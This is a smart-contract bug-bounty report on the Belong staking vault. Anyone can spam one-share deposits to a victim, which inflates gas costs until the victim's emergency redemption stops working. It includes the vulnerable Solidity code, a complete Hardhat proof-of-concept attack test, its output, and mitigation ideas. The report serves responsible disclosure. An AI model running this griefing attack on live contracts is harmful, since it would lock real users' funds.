# 57423 sc medium unbounded gas consumption in emergency redemption enables low cost dos against staking vault users

**Submitted on Oct 26th 2025 at 04:14:32 UTC by @InquisitorScythe for** [**Audit Comp | Belong**](https://immunefi.com/audit-competition/audit-comp-belong)

* **Report ID:** #57423
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/periphery/Staking.sol>
* **Impacts:**
  * Unbounded gas consumption

## Description

### Brief / Intro

The Staking contract allows users to deposit tokens and redeem them, including via emergency flows. However, the contract's design permits any user to create an unbounded number of stake entries for any receiver. This results in emergency redemption/withdrawal operations for the victim becoming O(n) in gas cost, where n is the number of stake entries. An attacker can exploit this by creating thousands of small stake entries for a victim, making emergency exits infeasible due to gas limits, and thus locking the victim's funds with negligible cost.

### Vulnerability Details

* The contract inherits ERC4626 and exposes deposit/mint functions that allow any caller to specify the receiver address.
* In the Staking contract, each deposit for a receiver appends a new Stake entry to `stakes[receiver]`:

  ```solidity
  function _deposit(address by, address to, uint256 assets, uint256 shares) internal override {
      super._deposit(by, to, assets, shares);
      stakes[to].push(Stake({shares: shares, timestamp: block.timestamp}));
  }
  ```

  Source: <https://github.com/belongnet/checkin-contracts/blob/22d92a3af433a1cf4d0aa758f872c887b2f33db8/contracts/v2/periphery/Staking.sol#L242-L246>
* Emergency flows (`emergencyRedeem`, `emergencyWithdraw`) call `_emergencyWithdraw`, which invokes `_removeAnySharesFor`. This function iterates over all stake entries for the victim, performing swap-and-pop removals and multiple SSTORE operations per entry:

  ```solidity
  function _removeAnySharesFor(address staker, uint256 shares) internal {
      Stake[] storage userStakes = stakes[staker];
      uint256 remaining = shares;
      for (uint256 i; i < userStakes.length && remaining > 0;) {
          uint256 stakeShares = userStakes[i].shares;
          if (stakeShares <= remaining) {
              remaining -= stakeShares;
              userStakes[i] = userStakes[userStakes.length - 1];
              userStakes.pop();
          } else {
              userStakes[i].shares = stakeShares - remaining;
              remaining = 0;
              unchecked { ++i; }
          }
      }
  }
  ```

  Source: <https://github.com/belongnet/checkin-contracts/blob/22d92a3af433a1cf4d0aa758f872c887b2f33db8/contracts/v2/periphery/Staking.sol#L296-L315>
* The attacker can repeatedly call `mint(1, victim)` or `deposit(1, victim)` to create thousands of stake entries for the victim at minimal cost (1 token per entry when A/S ≈ 1).
* When the victim attempts to redeem or withdraw in an emergency, the contract must process all entries, causing the transaction to require O(n) gas. With enough entries, this exceeds the block gas limit, making the operation impossible in a single transaction.

### Impact Details

* Denial-of-Service (DoS): The victim is unable to perform emergency redemption or withdrawal in a single transaction, effectively locking their funds.
* Low Attack Cost: The attacker only needs to spend a small amount of tokens (e.g., 2,000 tokens to create 2,000 entries) to lock a much larger victim balance (e.g., 100,000 tokens).
* Gas Consumption: PoC results show baseline `emergencyRedeem` gas at \~130,000, but after attack, gas rises to \~24,000,000, approaching the Ethereum block gas limit.

## References

* <https://github.com/belongnet/checkin-contracts/blob/22d92a3af433a1cf4d0aa758f872c887b2f33db8/contracts/v2/periphery/Staking.sol#L242-L246>
* <https://github.com/belongnet/checkin-contracts/blob/22d92a3af433a1cf4d0aa758f872c887b2f33db8/contracts/v2/periphery/Staking.sol#L296-L315>

## Proof of Concept

Summary of the PoC test procedure:

{% stepper %}
{% step %}

### Deploy and setup

* Deploy a mock LONG token and the Staking contract.
* Mint tokens to victim and attacker and approve staking.
* Victim deposits a large amount (creating one large stake entry).
  {% endstep %}

{% step %}

### Baseline measurement

* Estimate gas for victim calling `emergencyRedeem` for their shares before the attack.
  {% endstep %}

{% step %}

### Attack

* Attacker repeatedly mints many 1-share entries for the victim by calling `mint(1, victim)` in batches, creating thousands of small stake entries credited to the victim.
* Track attack cost in assets and attacker balance.
  {% endstep %}

{% step %}

### Post-attack measurement and assertion

* Estimate gas for victim `emergencyRedeem` again after the attack.
* Compare baseline vs after-attack gas estimate (expect large increase or OOG).
  {% endstep %}
  {% endstepper %}

Full PoC test file (use `yarn test test/v2/platform/StakingEmergencyDoS.poc.test.ts`):

```solidity
import { expect } from "chai";
import { ethers, upgrades } from "hardhat";
import { BigNumber } from "ethers";

describe("Staking emergency DoS PoC", function () {
  // This PoC demonstrates that an attacker can push many small stake entries
  // into a victim's `stakes` array (via deposit/mint with receiver = victim),
  // causing the victim's emergencyRedeem/emergencyWithdraw to become
  // prohibitively expensive in gas (or OOG) when attempted in a single tx.
  //
  // The test will:
  //  - deploy a mock LONG token and the Staking contract
  //  - have victim deposit a large amount (one big stake entry)
  //  - have attacker mint many 1-share entries credited to victim
  //  - measure estimateGas for emergencyRedeem before/after attack
  //  - print attack cost vs victim balance and gas numbers
  
  let long: any;
  let staking: any;
  let owner: any;
  let treasury: any;
  let attacker: any;
  let victim: any;
  
  const GAS_THRESHOLD = BigNumber.from(25_000_000); // 25M as an alarm threshold

  beforeEach(async function () {
    [owner, treasury, attacker, victim] = await ethers.getSigners();

    // Deploy a simple ERC20 mock (Erc20Example.sol exists in repository as tests assume)
  const ERC20 = await ethers.getContractFactory("WETHMock");
  long = await ERC20.deploy();
    await long.deployed();

    // Deploy Staking contract
    const StakingCF = await ethers.getContractFactory("Staking");
    staking = await upgrades.deployProxy(
      StakingCF,
      [owner.address, treasury.address, long.address],
      { initializer: "initialize", unsafeAllow: ["constructor"] }
    );
    await staking.deployed();

  // Mint tokens to victim and attacker and approve staking
  // Mint big amount to victim
  const victimInitial = ethers.utils.parseEther("100000"); // 100k LONG
  await long.mint(victim.address, victimInitial);
    await long.connect(victim).approve(staking.address, victimInitial);

    // Give attacker a modest budget that is expected to be enough for many small stakes
    const attackerBudget = ethers.utils.parseEther("5000"); // 5k LONG
    await long.mint(attacker.address, attackerBudget);
    await long.connect(attacker).approve(staking.address, attackerBudget);
  });

  it("PoC: attacker low-cost locks victim emergencyRedeem (estimateGas comparison)", async function () {
    // Victim makes a single large deposit -> one stake entry
    const victimDeposit = ethers.utils.parseEther("100000");
    const depositTx = await staking.connect(victim).deposit(victimDeposit, victim.address);
    await depositTx.wait();

    // Baseline: estimate gas for victim emergencyRedeem of all shares
    const victimShares = await staking.balanceOf(victim.address);
    console.log("[info] victim initial shares:", victimShares.toString());

    // estimateGas may throw or return a big number; use try/catch
    let baselineGas: BigNumber;
    try {
      baselineGas = await staking.connect(victim).estimateGas.emergencyRedeem(victimShares, victim.address, victim.address);
      console.log("[baseline] emergencyRedeem estimateGas:", baselineGas.toString());
    } catch (err) {
      baselineGas = BigNumber.from(0);
      console.log("[baseline] estimateGas threw:", (err as Error).message);
    }

    // Attack: attacker mints many 1-share entries credited to victim
    // We'll use mint(1, victim) which mints exactly 1 share worth of assets (previewMint used internally)
    // However some ERC4626 implementations use previewMint rounding; we proceed with mint(1,..)
    const N = 2000; // number of small entries to create; adjust if needed
    console.log("[attack] creating", N, "one-share entries for victim (from attacker)");

    // To measure cost of attack in assets, accumulate previewMint(1) as assetsPerEntry
    const assetsPerEntry = await staking.previewMint(1);
    console.log("[attack] assetsPerEntry (previewMint(1)):", assetsPerEntry.toString());

    // Compute expected total cost in assets and ensure attacker has enough tokens
    const expectedTotalCost = assetsPerEntry.mul(N);
    console.log("[attack] expected total assets cost:", expectedTotalCost.toString());

    // Quick sanity: check attacker balance
    const attackerBalance = await long.balanceOf(attacker.address);
    console.log("[attack] attacker LONG balance:", attackerBalance.toString());

    // If attacker has insufficient funds for N entries, reduce N adaptively
    let effectiveN = N;
    if (attackerBalance.lt(expectedTotalCost)) {
      effectiveN = Math.floor(Number(attackerBalance.div(assetsPerEntry).toString()));
      console.log("[attack] attacker has insufficient funds, reduced N ->", effectiveN);
    }

    // Perform the mint loop in batches to avoid huge single txs from the attacker
    const BATCH = 50;
    let minted = 0;
    for (let i = 0; i < effectiveN; i += BATCH) {
      const end = Math.min(i + BATCH, effectiveN);
      const txs = [];
      for (let j = i; j < end; ++j) {
        // mint 1 share to victim
        txs.push(staking.connect(attacker).mint(1, victim.address));
      }
      // send batch sequentially to keep things simple
      for (const txPromise of txs) {
        const tx = await txPromise;
        await tx.wait();
        minted += 1;
      }
      if (i % 500 === 0) console.log(`[attack] minted ${minted} entries so far`);
    }

    console.log("[attack] total minted entries:", minted);

    // Post-attack shares for victim
    const victimSharesAfter = await staking.balanceOf(victim.address);
    console.log("[info] victim shares after attack:", victimSharesAfter.toString());

    // Estimate gas for emergencyRedeem after attack
    let attackGas: BigNumber;
    try {
      attackGas = await staking.connect(victim).estimateGas.emergencyRedeem(victimSharesAfter, victim.address, victim.address);
      console.log("[attack] emergencyRedeem estimateGas:", attackGas.toString());
    } catch (err) {
      attackGas = BigNumber.from(0);
      console.log("[attack] estimateGas threw (likely OOG or too expensive):", (err as Error).message);
    }

    // Print comparison
    console.log("\n--- Summary ---");
    console.log("baselineGas:", baselineGas.toString());
    console.log("attackGas:", attackGas.toString());
    console.log("attackerTotalCost (assets):", assetsPerEntry.mul(minted).toString());
    console.log("victimTotalShares:", victimSharesAfter.toString());

    // Assertions to mark the PoC as demonstrating the issue
    // We assert that attackGas is significantly larger than baselineGas OR that estimateGas failed
    if (baselineGas.gt(0) && attackGas.gt(0)) {
      // require at least 5x increase or exceed GAS_THRESHOLD
      const increased = attackGas.gte(baselineGas.mul(5)) || attackGas.gte(GAS_THRESHOLD);
      expect(increased, "attack did not significantly increase gas").to.be.true;
    } else {
      // If estimateGas threw after attack, that's also a valid demonstration
      expect(attackGas.eq(0) || attackGas.gte(GAS_THRESHOLD), "attack did not make estimateGas fail or exceed threshold").to.be.true;
    }

  }).timeout(0);
});
```

Example output (from PoC run):

```
cd /home/ubuntu/web3/checkin-contracts && yarn test test/v2/platform/StakingEmergencyDoS.poc.test.ts
yarn run v1.22.22
warning package.json: No license field
$ hardhat test test/v2/platform/StakingEmergencyDoS.poc.test.ts


  Staking emergency DoS PoC
Warning: Potentially unsafe deployment of contracts/v2/periphery/Staking.sol:Staking

    You are using the `unsafeAllow.constructor` flag.

[info] victim initial shares: 100000000000000000000000
[baseline] emergencyRedeem estimateGas: 131778
[attack] creating 2000 one-share entries for victim (from attacker)
[attack] assetsPerEntry (previewMint(1)): 1
[attack] expected total assets cost: 2000
[attack] attacker LONG balance: 5000000000000000000000
[attack] minted 50 entries so far
[attack] minted 550 entries so far
[attack] minted 1050 entries so far
[attack] minted 1550 entries so far
[attack] total minted entries: 2000
[info] victim shares after attack: 100000000000000000002000
[attack] emergencyRedeem estimateGas: 23998844

--- Summary ---
baselineGas: 131778
attackGas: 23998844
attackerTotalCost (assets): 2000
victimTotalShares: 100000000000000000002000
    ✔ PoC: attacker low-cost locks victim emergencyRedeem (estimateGas comparison) (33748ms)


  1 passing (38s)

Done in 42.80s.
```

## Notes for Remediation (informational)

* The root cause is unbounded growth of per-user stake entries coupled with linear-time emergency processing. Possible mitigations include:
  * Consolidate stakes for the same receiver (e.g., merge new deposits into the last stake entry when certain conditions hold).
  * Use a data structure or accounting design that avoids O(n) per-user emergency operations (e.g., aggregate balances per user instead of per-deposit entries).
  * Restrict who may specify arbitrary receivers on deposits, or add rate-limiting/anti-spam measures for crediting other accounts.
  * Introduce gas-bounded withdrawal patterns (e.g., paginated emergency withdrawals) or enable the contract owner to perform state-compacting operations.

(Do not consider the above as prescriptive code; they are high-level mitigation directions based on the observed issue.)
